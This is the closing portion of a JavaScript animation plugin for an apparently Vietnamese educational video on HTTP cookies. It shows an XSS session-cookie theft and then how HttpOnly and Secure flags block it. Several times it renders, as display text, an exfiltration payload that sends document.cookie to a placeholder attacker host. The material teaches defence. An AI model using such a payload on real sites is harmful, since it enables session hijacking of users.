                const t = progress / 0.38;
                placePacket(pktNormal, devToolsOff, serverOff, t);
                hidePacket(pktHack);
                if (hackerCard) {
                    hackerCard.className = 'v35-hacker-card';
                    hackerCard.innerHTML = hackerConsoleHTML('fetch(\'http://hacker.com/steal?c=\' + document.cookie)', 'Listening for stolen data...', false);
                }
                if (devtoolsBody) {
                    devtoolsBody.innerHTML = `
                        <div class="v35-devtools-path">Storage > Cookies > https://sneakerland.vn</div>
                        ${devToolsHTML([{ name: 'session_id', value: 'xyz', domain: 'sneakerland.vn', httpOnly: false, secure: false, highlight: false }], false)}
                    `;
                }
                if (status) status.textContent = '1. Session ID có nguy cơ bị XSS đánh cắp';
                if (badge) {
                    badge.className = 'v35-status-badge red';
                    badge.innerHTML = '<i data-lucide="shield-alert" style="width:12px;height:12px;"></i> Session Theft Risk';
                }
                if (card) card.className = 'v35-glass-card glow-red';
                if (serverLog) {
                    serverLog.innerHTML = 'HTTPS Connection Active\nCookie Session: OK';
                    serverLog.className = 'v35-term-log';
                }
            } else if (progress < 0.65) {
                // Hacker steals the cookie
                hidePacket(pktNormal);
                const t = (progress - 0.38) / 0.27;
                placePacket(pktHack, devToolsOff, hackerOff, t);
                if (pCoreHack) {
                    pCoreHack.className = 'v35-packet-core emoji stolen';
                    pCoreHack.innerText = '🍪';
                }
                if (pktHackLbl) pktHackLbl.textContent = 'Stealing...';

                if (hackerCard) {
                    hackerCard.className = 'v35-hacker-card active';
                    hackerCard.innerHTML = hackerConsoleHTML('fetch(\'http://hacker.com/steal?c=\' + document.cookie)', 'Exploiting... Stolen ID = xyz', true);
                }
                if (status) status.textContent = '❌ Cảnh báo! Cookie trần bị JS đọc và đánh cắp';
                if (badge) {
                    badge.className = 'v35-status-badge red';
                    badge.innerHTML = '<i data-lucide="zap-off" style="width:12px;height:12px;"></i> Hijacked!';
                }
                if (serverLog) {
                    serverLog.innerHTML = 'Warning: Session Hijack Detected!\nStolen token in use.';
                    serverLog.className = 'v35-term-log error';
                }
            } else if (progress < 0.82) {
                // Shield Activates: HttpOnly and Secure
                hidePacket(pktHack);
                hidePacket(pktNormal);
                if (devtoolsBody) {
                    devtoolsBody.innerHTML = `
                        <div class="v35-devtools-path">Storage > Cookies > https://sneakerland.vn</div>
                        ${devToolsHTML([{ name: 'session_id', value: 'xyz', domain: 'sneakerland.vn', httpOnly: true, secure: true, highlight: true }], true)}
                    `;
                    // Immediately trigger shield display
                    const shieldOverlay = devtoolsBody.querySelector('#v35-security-shield');
                    if (shieldOverlay) shieldOverlay.classList.add('show');
                }
                if (hackerCard) {
                    hackerCard.className = 'v35-hacker-card';
                    hackerCard.innerHTML = hackerConsoleHTML('fetch(\'http://hacker.com/steal?c=\' + document.cookie)', 'Re-evaluating document.cookie...', false);
                }
                if (status) status.textContent = '2. Kích hoạt cờ HttpOnly & Secure';
                if (badge) {
                    badge.className = 'v35-status-badge green';
                    badge.innerHTML = '<i data-lucide="shield" style="width:12px;height:12px;"></i> Shield Activated';
                }
                if (card) card.className = 'v35-glass-card glow-green';
                if (serverLog) {
                    serverLog.innerHTML = 'HTTPS Connection Active\nCookie secured with HttpOnly & Secure flags.';
                    serverLog.className = 'v35-term-log success';
                }
            } else {
                // Hacker attempts but is blocked
                if (devtoolsBody) {
                    devtoolsBody.innerHTML = `
                        <div class="v35-devtools-path">Storage > Cookies > https://sneakerland.vn</div>
                        ${devToolsHTML([{ name: 'session_id', value: 'xyz', domain: 'sneakerland.vn', httpOnly: true, secure: true, highlight: false }], true)}
                    `;
                    const shieldOverlay = devtoolsBody.querySelector('#v35-security-shield');
                    if (shieldOverlay) shieldOverlay.classList.add('show');
                }

                const t = (progress - 0.82) / 0.18;
                placePacket(pktHack, devToolsOff, hackerOff, t);
                if (pCoreHack) {
                    pCoreHack.className = 'v35-packet-core emoji stolen';
                    pCoreHack.innerText = '🛡️';
                }
                if (pktHackLbl) pktHackLbl.textContent = 'Blocked 🛡️';

                if (hackerCard) {
                    hackerCard.className = 'v35-hacker-card';
                    hackerCard.innerHTML = hackerConsoleHTML('fetch(\'http://hacker.com/steal?c=\' + document.cookie)', 'Access Denied: document.cookie is empty!', false);
                }
                if (status) status.textContent = '✓ HttpOnly chặn đứng JS đọc cookie. Bảo mật!';
            }
        }
        else if (slideId === 'slide_cookie_outro') {
            canvas.querySelectorAll('.v35-recap-card').forEach((card, i) => {
                const threshold = 0.05 + i * 0.20;
                card.classList.toggle('active', progress >= threshold);
            });
        }
    }

    window.VideoPlugin = {
        scriptName: 'video35',
        topic: 'HTTP Cookies',
        episodeNum: 35,
        customSlideIds,
        keywordsData,
        renderGfx,
        updateFrame
    };

    console.log('[Video35 Plugin] Loaded: HTTP Cookies story simulation.');
})();
